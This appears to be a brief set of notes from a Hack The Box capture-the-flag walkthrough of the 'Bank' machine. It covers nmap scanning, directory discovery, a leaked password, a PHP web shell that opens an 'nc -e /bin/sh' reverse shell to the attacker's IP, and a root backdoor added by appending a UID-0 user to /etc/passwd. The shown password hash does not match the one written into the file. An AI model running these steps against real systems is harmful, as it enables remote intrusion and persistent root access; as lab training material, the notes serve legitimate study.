```
nmap -sV -sC -oA nmap -T4 10.10.10.29
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-22 08:44 EDT
Nmap scan report for 10.10.10.29
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.86 seconds
root@kali:~/HTB/bank#
```



DNS on TCP 
- Check for zone transfers

DirBuster
```
http://bank.htb/server-status/
http://bank.htb/balance-transfer/
```


wget -r -np http://bank.htb/balance-transfer/

```
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```

Check code of the support page.
Upload PHP file:
```
filename="shell.htb"
```

```
http://bank.htb/uploads/shell.htb?fexec=nc%20-e%20/bin/sh%2010.10.14.9%204444
```


```
# to generate hash of the password
openssl passwd mrcake
hKLD3431415ZE

# to create a second root user with "mrcake" password
echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd

# to switch to a root2
su root2
Password: mrcake



root@bank:~# cat root.txt
d5be56adc67b488f81a4b9de30c8a68e

```


Also SUID: `/var/htb/bin/emergency`
